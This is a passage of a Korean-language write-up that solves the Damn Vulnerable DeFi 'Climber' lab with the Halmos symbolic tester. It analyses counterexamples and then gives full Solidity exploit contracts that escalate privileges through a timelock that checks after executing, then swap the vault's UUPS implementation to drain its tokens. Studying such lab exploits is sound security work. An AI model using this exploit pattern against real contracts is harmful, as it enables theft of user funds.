        halmos_execute_value_uint256_59c9434_46 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_76d9b17_91 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_be6fe48_136 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_fallback_selector_bytes4_1f7f8b9_140 = 0xfe96ffd0
        halmos_fallback_target_address_593d2c0_141 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_salt_bytes32_33f5d35_184 = 0x0000000000000000000000000000000000000000000000000000000000000001
        halmos_schedule_selector_bytes4_47daa14_190 = updateDelay
        halmos_schedule_selector_bytes4_98bf8d3_193 = 0xfe96ffd0
        halmos_schedule_selector_bytes4_badb2f8_187 = grantRole
        halmos_schedule_target_address_4586a03_191 = 0x00000000000000000000000000000000aaaa0007
        halmos_schedule_target_address_70b108c_188 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_target_address_bfbafb8_185 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_value_uint256_8e27f62_189 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_e67d049_192 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_fb6813c_186 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_selector_bytes4_4da5861_47 = grantRole
        halmos_selector_bytes4_8a4ebe8_142 = schedule
        halmos_selector_bytes4_9c02733_02 = execute
        halmos_selector_bytes4_9e9a490_92 = updateDelay
        halmos_selector_bytes4_e8b0dd5_137 = 0x00000000
        halmos_symbolicProposer_address_d2fabe5_196 = 0x00000000000000000000000000000000aaaa0007
        halmos_symbolicSpender_address_2bbb991_195 = 0x0000000000000000000000000000000000000000
        p_account_address_ffb2231_67 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
        p_dataElements_length_e275aaa_13 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_dataElements_length_f569229_175 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_newDelay_uint64_48ccc1d_133 = 0x0000000000000000000000000000000000000000000000000000000000000000
        p_role_bytes32_8629c87_66 = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
        p_targets_length_6074178_167 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_targets_length_baf4649_05 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_3bb651e_171 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_fb84b24_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
    ```
    12시간 동안 실행한 후에도 이 테스트는 끝나지 않았지만 로그에는 이러한 반례들이 나타났습니다.

    이제 `padding` 접근 방식의 결과입니다:
    ```javascript
    Counterexample:
        halmos_attack_target_address_86f6449_01 = 0x00000000000000000000000000000000aaaa0005
        halmos_attacker_fallback_bytes_bytes_90b79e7_232 =0xfe96ffd000...00
        halmos_execute_salt_bytes32_2990340_76 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_target_address_6ccd436_229 = 0x00000000000000000000000000000000aaaa0007
        halmos_execute_target_address_758a916_77 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_target_address_cbc4982_153 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_value_uint256_72ea987_230 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_a378b3a_78 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_e0744d2_154 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_fallback_selector_bytes4_40e69fe_233 = 0xfe96ffd0
        halmos_fallback_target_address_2a6a6d5_234 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_dataElement_bytes_6357486_312 = 0x2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc100000000000000000000000000000000000000000000000000000000aaaa00070000...0000
        halmos_schedule_dataElement_bytes_6cf3e82_318 = 0xfe96ffd00...00
        halmos_schedule_dataElement_bytes_d371a19_315 = 0x24adbc5b0000...00
        halmos_schedule_salt_bytes32_30a561e_309 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_target_address_3300998_310 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_target_address_54a83e2_313 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_target_address_acccabc_316 = 0x00000000000000000000000000000000aaaa0007
        halmos_schedule_value_uint256_00f2ce0_314 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_84492c4_311 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_c55499e_317 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_selector_bytes4_4430fc8_235 = schedule
        halmos_selector_bytes4_6f515b8_155 = updateDelay
        halmos_selector_bytes4_9e365a0_79 = grantRole
        halmos_selector_bytes4_dac778d_231 = 0x00000000
        halmos_selector_bytes4_e4ab912_02 = execute
        halmos_symbolicProposer_address_25e4d36_321 = 0x00000000000000000000000000000000aaaa0007
        halmos_symbolicSpender_address_333c37a_320 = 0x0000000000000000000000000000000000000000
        p_account_address_6c30a3a_115 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
        p_dataElements_length_07a1aff_284 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_dataElements_length_3b34ffe_13 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_newDelay_uint64_9ae67d3_228 = 0x0000000000000000000000000000000000000000000000000000000000000000
        p_role_bytes32_5ad2b96_114 = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
        p_targets_length_3f820ec_276 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_targets_length_733ccd3_05 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_90beef3_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_dc7b73d_280 = 0x0000000000000000000000000000000000000000000000000000000000000003
    ```

### 반례 분석
첫 번째 것부터 시작해 봅시다. 다음 몇 줄에 관심이 있습니다:
```javascript
halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
halmos_execute_selector_bytes4_1645f73_89 = grantRole
halmos_execute_selector_bytes4_8dd39aa_179 = schedule
halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
...
halmos_schedule_selector_bytes4_76b87f6_189 = schedule
halmos_schedule_selector_bytes4_79d11c7_186 = updateDelay
halmos_schedule_selector_bytes4_e3c43da_183 = grantRole
halmos_schedule_target_address_01c0fa0_184 = 0x00000000000000000000000000000000aaaa0005
halmos_schedule_target_address_7f47fc1_187 = 0x00000000000000000000000000000000aaaa0005
halmos_schedule_target_address_be00243_181 = 0x00000000000000000000000000000000aaaa0005
```
Halmos는 흥미로운 시나리오를 보았습니다: 누구나 `operation`으로 다음 함수 시퀀스를 호출할 수 있습니다:
1. `ClimberTimelock::updateDelay()`를 호출하여 `delay`를 비활성화합니다.
2. `timelock` 자체에 `PROPOSER_ROLE` 역할을 부여합니다.
3. 실행 중에 트랜잭션 자체를 등록하기 위해 `schedule()`을 호출합니다.

따라서 우리는 `ClimberTimelock`의 `PROPOSER_ROLE`의 불변성에 대한 불변 조건을 깨뜨렸습니다.

이것이 무엇을 의미할까요? 만약 우리가 `attacker`에 의해 `ClimberTimelock` 계약을 관리할 수 있는 메커니즘을 가지고 있다면, 우리는 전체 공격을 쉽게 찾을 수 있을까요? 그렇게 빠르진 않습니다! 불행히도 이것은 현재로서는 가짜 반례입니다. 기억하시나요, 우리가 `id` 저장 공식을 약간 단순화했다는 것을? 이 발견된 반례를 원래 `id` 계산 메커니즘에 적용해 봅시다. 전체 바이트 세트를 연결로 되돌리고 위에 설명된 시나리오에 따라 자체적으로 등록하는 트랜잭션을 찾아봅시다:
```solidity
function getOperationId(
    address[] memory targets,
    uint256[] memory values,
    bytes[] memory dataElements,
    bytes32 salt
) public pure returns (bytes32) {
    return keccak256(abi.encode(targets, values, dataElements, salt));
}
```
```
그리고... 우리는 단순히 이 작업에 대처할 수 없습니다. 이것을 설명하기 위해 약간의 수학적 언어를 사용해야 합니다. 간단히 말해 `abi.encode(targets, values, dataElements, salt)`를 `A`라고 합시다. 따라서 `A`는 `execute()`에 전달된 모든 매개변수를 인코딩하는 바이트 배열입니다. 그러한 `operation`을 스케줄하기 위해 `dataElements[]` 배열의 마지막 매개변수는 `execute()`에 전달된 것과 동일한 매개변수 집합, 즉 다시 `A`여야 합니다. 즉, 이 시나리오에서 `A`는 `A`의 일부여야 합니다. `A`가 인코딩된 `updateDelay()`와 `grantRole()`도 포함해야 하는 경우 이것이 불가능하다는 것을 설명할 필요는 없다고 생각합니다.

요약하자면: 우리는 다소 모순된 결과에 직면했습니다. 한편으로는 `id` 계산의 단순화가 가짜 반례로 이어졌습니다. 하지만 다른 한편으로는, 경험 많은 감사자는 그러한 결과에서도 안전한 계약 작성의 중요한 [원칙](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) 위반을 알아차릴 것입니다: 먼저 전달된 매개변수를 검증한 다음 실행합니다:
```solidity
bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);

for (uint8 i = 0; i < targets.length; ++i) {
    _targets[i].functionCallWithValue(_dataElements[i], _values[i]);
}

// Checking should be done BEFORE execution, not AFTER!!!
if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}
```
따라서 이 가짜 반례를 기반으로도 실제 공격을 실제로 찾을 수 있습니다.

그러나 두 번째 반례를 고려할 때 이 모든 문제가 해결될 것이므로 긴장을 풀 수 있습니다. 우리는 다음 줄에 관심이 있습니다:
```javascript
...
halmos_attacker_fallback_bytes_bytes_303e2ea_138 = 0xfe96ffd0...00
...
halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
halmos_execute_selector_bytes4_1645f73_89 = grantRole
halmos_execute_selector_bytes4_ead1bb5_139 = 0xfe96ffd0
halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0007
halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
...
halmos_fallback_target_address_593d2c0_141 = 0x00000000000000000000000000000000aaaa0005
...
halmos_schedule_selector_bytes4_47daa14_190 = updateDelay
halmos_schedule_selector_bytes4_98bf8d3_193 = 0xfe96ffd0
halmos_schedule_selector_bytes4_badb2f8_187 = grantRole
halmos_schedule_target_address_4586a03_191 = 0x00000000000000000000000000000000aaaa0007
halmos_schedule_target_address_70b108c_188 = 0x00000000000000000000000000000000aaaa0005
halmos_schedule_target_address_bfbafb8_185 = 0x00000000000000000000000000000000aaaa0005
...
halmos_selector_bytes4_4da5861_47 = grantRole
halmos_selector_bytes4_8a4ebe8_142 = schedule
halmos_selector_bytes4_9c02733_02 = execute
halmos_selector_bytes4_9e9a490_92 = updateDelay
```
본질적으로 이것은 시나리오가 다른 동일한 버그입니다. 이번에는 `PROPOSER_ROLE` 역할을 `timelock`이 아니라 **SymbolicAttacker**에게 부여하고, **SymbolicAttacker**는 심볼릭 `fallback()`을 호출하여 이 `operation`을 등록합니다. 이 시나리오에서는 그러한 calldata를 생성할 수 없는 문제를 피할 수 있습니다. 따라서 이것은 완벽하게 유효한 버그 메커니즘입니다. 또한, 이제 우리는 **SymbolicAttacker**에게 `PROPOSER_ROLE` 권한을 부여하는 방법을 알고 있습니다.

그리고 `padding` 접근 방식을 사용한 반례는 어떻습니까? 이것은 기본적으로 방금 살펴본 것과 동일한 시나리오입니다. 정확히 동일한 호출을 보여줍니다.

두 접근 방식을 비교할 때입니다:
1. 직관성:
    `padding` 방법을 사용하는 것이 직관적인 관점에서는 훨씬 더 좋아 보입니다: 우리는 주요 함수의 구현을 변경하지 않으며, 우리가 무엇을 하고 있는지 설명하기가 더 쉽습니다.
2. 가짜 반례:
    `padding` 방법을 사용하면 유효성 검사를 단순화하지 않으므로 가짜 반례가 나타나지 않았습니다. 이것은 이미 심볼릭 오프셋 오류로 인한 변경으로 인해 큰 고통을 겪고 있는 심볼릭 테스트의 "학문성"을 보존하는 데 큰 장점입니다.
3. 속도:
    하지만 여기서 확실한 승자는 단순화된 `id` 접근 방식입니다. 긴 calldata 처리, 패딩 지속적 계산 등과 비교하여 그러한 심볼릭 테스트를 실행하는 속도는 제 머신에서 평균 60% 더 빨랐습니다. 그리고 그에 따라 유효한 반례가 훨씬 더 일찍 나타나기 시작했습니다.

여기서 무엇을 결론지을 수 있을까요? 심볼릭 테스트가 약간 "해킹적"으로 보이고 속도와 성능을 위해 가짜 반례를 수동으로 필터링해야 한다는 사실을 감내할 의향이 있다면: 테스트에서 유효성 검사를 단순화할 수 있습니다. 그렇지 않다면 더 "깨끗한" 접근 방식을 찾는 것이 좋습니다.

### keccak256 맵 키 처리
다음 단계로 넘어가기 전에, 심볼릭 분석의 맥락에서 Halmos가 여기서 암호화를 어떻게 처리했는지에 대해 몇 마디 할 가치가 있습니다. 사실 [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#counterexamples-analysis)와 [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder#dealing-with-merkle-functions)에서 암호화에 대한 약한 처리를 본 후, Halmos로 작업할 때 암호화를 **전혀** 피해야 한다는 인상을 받았습니다. 하지만 이 챌린지는 Halmos가 여기서 꽤 중요한 일을 해냈기 때문에 제 생각을 조금 바꾸게 만들었습니다.

`schedule()`에서 `operations`는 bytes32 키 (`id`)로 저장됩니다:
```solidity
operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
operations[id].known = true;
```
이 `id`는 본질적으로 어떤 복잡한 심볼릭 값의 **keccak256** 해시입니다(이 해시 또한 심볼릭 값처럼 동작합니다):
```javascript
f_sha3_4096(Concat(...,halmos_schedule_salt_bytes32_8b37382_249, ...))
```
즉, `operation`은 이 심볼릭 키를 사용하여 저장되었습니다.

다음으로, `execute()`에서 우리는 비슷한 방식으로 구성된 또 다른 `id`를 가지고 있습니다:
```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
{
    bytes32 id = getOperationId(_targets, _values, _dataElements, _salt);
    ...
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```
이번에는 id가 조금 다르게 보이지만 동일한 구조를 가집니다:
```javascript
f_sha3_4096(Concat(...,halmos_execute_salt_bytes32_ae9ed2c_76, ...))
```
반례를 올바르게 찾으려면 다음을 수행해야 합니다:
1. `execute()`에서 반환된 키가 `schedule()`에서 데이터가 저장된 키와 같을 수 있다고 가정합니다:
    `sha3(complex_sym_val1) == sha3(complex_sym_val2)`
2. 2개의 해시가 같다면 그 뒤에 있는 심볼릭 값도 동일하다고 가정합니다:
    `(sha3(complex_sym_val1) == sha3(complex_sym_val2)) ==> (complex_sym_val1 == complex_sym_val2)`
    이것은 쉽지 않은 동작입니다. 이것은 엔진 수준에서의 지원이 필요하며, Halmos는 이 로직을 구현합니다! 그렇지 않다면 우리는 지속적인 가짜 해시 충돌을 처리하거나 반례를 전혀 찾지 못하는 문제를 겪어야 했을 것입니다.

Halmos 리포지토리의 회귀 테스트를 분석하여 구현된 휴리스틱의 전체 목록을 얻을 수 있습니다. 예를 들어 다음에 대한 테스트가 있습니다:
1. [keccak256()](https://github.com/a16z/halmos/blob/5c5ca39a1ee943ad8c8dc2fe042bdea44413ed69/tests/regression/test/Sha3.t.sol#L7)
2. [Signatures/ecrecover](https://github.com/a16z/halmos/blob/5c5ca39a1ee943ad8c8dc2fe042bdea44413ed69/tests/regression/test/Signature.t.sol)

등등.

## preload 구현
우리는 `PROPOSER_ROLE` 권한을 잠금 해제하고 새로운 시나리오를 테스트하기 위해 preload([selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#symbolicattacker-preload)에서처럼)를 추가할 것입니다.
```solidity
function check_climber() public checkSolvedByPlayer {
    ...
    attacker.preload();
    attacker.attack();
}
```
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    bool is_preload = false;
    ...
    fallback() external payable {
        if (is_preload)
        {
            bytes32 salt = hex"01";
            address[] memory targets = new address[](3);
            uint256[] memory values = new uint256[](3);
            bytes[] memory dataElements = new bytes[](3);
            targets[0] = address(timelock);
            targets[1] = address(timelock);
            targets[2] = address(this);
            values[0] = 0;
            values[1] = 0;
            values[2] = 0;
            dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
            dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
            dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");
            timelock.schedule_preload(targets, values, dataElements, salt);
            return ;
        }
    ...
    }
    ...
    function preload(ClimberTimelock timelock) public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        is_preload = true;
        timelock = _timelock;
        bytes32 salt = hex"01";
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");
        timelock.execute_preload(targets, values, dataElements, salt);
        is_preload = false;
    }   
```
...
```solidity
contract ClimberTimelock is ClimberTimelockBase, FoundryCheats, HalmosCheats {
    ...
    bool is_preload;
    ...
    constructor(address admin, address proposer) {
        ...
        is_preload = true;
    }
    ...
    // Special functions versions to use preload. 
    // Essentially, these are the original, non-symbolic versions of the execute and schedule functions,
    // but they can only be executed during preload.
    function schedule_preload(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external onlyRole(PROPOSER_ROLE) {
        _vm.assume(is_preload == true);
        ...
    }
    
    function execute_preload(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
        _vm.assume(is_preload == true);
        ...
        is_preload = false;
    }
```
이제 `timelock`을 대신하여 어떤 호출이든 실행할 수 있는 권한이 있으므로(심지어 `delay`도 `0`입니다), 솔버의 작업을 조금 단순화하고 스케줄에 작업이 있는지 확인하는 부분을 제거해 보겠습니다:
```solidity
/*
* The special version of execute() to use by SymbolicAttacker with escalated privileges.
* Schedule checking is removed for simplicity since we can propose and execute the same operation in 
* the same transaction
*/
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    if (targets.length <= MIN_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    //bytes32 id = getOperationId(targets, values, dataElements, salt);

    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes[] memory _dataElements = new bytes[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("execute_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        _targets[i] = _svm.createAddress("execute_target");
        _values[i] = _svm.createUint256("execute_value");
        (_targets[i], _dataElements[i]) = glob.get_concrete_from_symbolic_optimized(_targets[i]);
    }

    for (uint8 i = 0; i < targets.length; ++i) {
        uint snap0 = _vm.snapshotState();
        _targets[i].functionCallWithValue(_dataElements[i], _values[i]);
        uint snap1 = _vm.snapshotState();
        _vm.assume(snap0 != snap1);
    }

    /* We can make any operation ready for execution immediately
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }
    */
    //operations[id].executed = true;
}
```
그리고 물론, `PROPOSER_ROLE`의 불변성을 확인하는 불변 조건을 제거할 것입니다. 그렇지 않으면 모든 트랜잭션이 반례가 될 것입니다 :D
```solidity
// Check timelock roles immutability
/*
address symbolicProposer = svm.createAddress("symbolicProposer");
vm.assume(symbolicProposer != proposer);
assert(!timelock.hasRole(PROPOSER_ROLE, symbolicProposer));
*/
```

## 반례 분석 (v2)
이제 다른 불변 조건을 깰 수 있는지 확인해 봅시다:
```javascript
halmos --solver-timeout-assertion 0 --function check_climber --loop 100  --default-array-lengths 1 --solver-timeout-branching 0
...
Counterexample:
halmos_attack_target_address_a574b9f_01 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_86b06e3_37 = 0x00000000000000000000000000000000aaaa0004
halmos_execute_value_uint256_499d6db_38 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_is_implementation_bool_40ddd50_40 = 0x01
halmos_selector_bytes4_36049ca_02 = execute
halmos_selector_bytes4_95bf4f7_39 = upgradeToAndCall
halmos_symbolicSpender_address_2f0913e_54 = 0x0000000000000000000000000000000000000000
p_dataElements[0]_bytes_e41f222_10 = 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
p_dataElements[0]_length_eb3fe30_11 = 0x0000000000000000000000000000000000000000000000000000000000000064
p_dataElements_length_4ea5857_09 = 0x0000000000000000000000000000000000000000000000000000000000000001
p_data_bytes_2c011eb_49 = 0xf2fde38b00000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
p_data_length_82b6379_50 = 0x0000000000000000000000000000000000000000000000000000000000000064
p_newImplementation_address_27cdc9b_48 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_salt_bytes32_08e7bfb_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_targets[0]_address_52be91e_06 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_targets_length_c542a8b_05 = 0x0000000000000000000000000000000000000000000000000000000000000001
p_values[0]_uint256_1f68feb_08 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_values_length_7d0d274_07 = 0x0000000000000000000000000000000000000000000000000000000000000001
```
훌륭합니다! 이제 `vault` 구현을 변경하는 방법을 알았습니다. `timelock`을 대신하여 `upgradeToAndCall()`을 호출하기만 하면 됩니다. 사실 이 시점에서 공격 시나리오는 명백해졌습니다: 만약 우리가 `vault` **구현**을 교체할 수 있다면, 우리는 그 자산을 말 그대로 무엇이든 할 수 있으며, 토큰을 어디로든 보낼 수 있습니다. 챌린지 해결!

## 공격 구현
**Climber.t.sol**:
```solidity
function test_climber() public checkSolvedByPlayer {
    Attacker attacker = new Attacker();
    MaliciousImpl impl = new MaliciousImpl();
    attacker.attack(timelock, ERC1967Proxy(payable(address(vault))), impl, token, recovery);
}
```
**Attacker.sol**:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import "./MaliciousImpl.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Attacker {
    ClimberTimelock timelock;
    ERC1967Proxy vault;
    MaliciousImpl impl;
    DamnValuableToken token;
    address recovery;

    bool is_preload = false;

    fallback() external payable {
        bytes32 salt = hex"01";
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");

        bytes memory transferBytes = abi.encodeWithSignature("malicious_transfer(address,address)", address(token), recovery);
        dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(impl), transferBytes);

        timelock.schedule(targets, values, dataElements, salt);
    }

    function attack(ClimberTimelock _timelock, 
                        ERC1967Proxy _vault, 
                        MaliciousImpl _impl, 
                        DamnValuableToken _token, 
                        address _recovery) public {
        bytes32 salt = hex"01";
        timelock = _timelock;
        vault = _vault;
        impl = _impl;
        token = _token;
        recovery = _recovery;
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");

        bytes memory transferBytes = abi.encodeWithSignature("malicious_transfer(address,address)", address(token), recovery);
        dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(impl), transferBytes);
        timelock.execute(targets, values, dataElements, salt);(targets, values, dataElements, salt);
    }

}
```
**MaliciousImpl.sol**:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract MaliciousImpl is UUPSUpgradeable{
    constructor() {}

    function malicious_transfer(address token, address receiver) public {
        DamnValuableToken(token).transfer(receiver, 10_000_000e18);
    }
    
    function _authorizeUpgrade(address newImplementation) internal override {}

    fallback() external payable {}
}
```
실행:
```javascript
forge test --mp test/climber/Climber.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.63ms (438.35µs CPU time)
```
통과!

## 결론
1. 심볼릭 분석 중에 계약의 세부 사항을 고려하는 것이 중요합니다. 예를 들어, UUPS 프록시는 2개의 인터페이스를 동시에 구현하므로 설정의 심볼릭 순회 로직을 약간 변경해야 했습니다.
2. 2개의 바이트 배열을 심볼릭하게 비교해야 할 때 - **매우 주의**해야 합니다. 두 배열이 동일한 트랜잭션을 인코딩하지만 길이가 다르기 때문에 해시가 다를 수 있습니다.
3. 검증을 단순화하는 것은 버그를 찾는 데 매우 효과적일 수 있으며, 적어도 버그 패턴을 찾는 데 도움이 될 수 있습니다. 예, 우리는 가짜 반례를 만날 수 있지만, 그것이 실제 반례를 찾기 위한 대가라면 지불할 가치가 있을 수 있습니다.
4. 이 챌린지에서 우리는 다시 문제를 "잘라내어" "작은 조각으로 먹는" 데 성공했습니다: 먼저 권한 상승을 찾은 다음, 이러한 권한을 가지고 프록시 구현을 변경하는 메커니즘을 찾았습니다. 그러나 권한 상승 버그는 원자적이며 본질적으로 나눌 수 없습니다. Halmos는 이것에도 대처했어지만, 작업에서 심볼릭 호출 수를 크게 확장하고 무언가가 발견될 때까지 몇 시간을 기다려야 했습니다.
5. **SymbolicAttacker**에 대한 심볼릭 `fallback()` 기능은 이 챌린지를 해결하는 데 필요한 것으로 판명되었습니다. 이 기능은 향후 챌린지에도 유용할 것입니다!
6. Halmos는 암호화 기능을 다루는 몇 가지 효과적인 기술을 가지고 있습니다. Halmos가 할 수 있는 것과 할 수 없는 것을 이해하여 현재 테스트에 대한 기능 범위를 더 잘 예측하고, 다른 한편으로는 결과가 "마법"처럼 보이지 않도록 하는 것이 좋습니다 :D
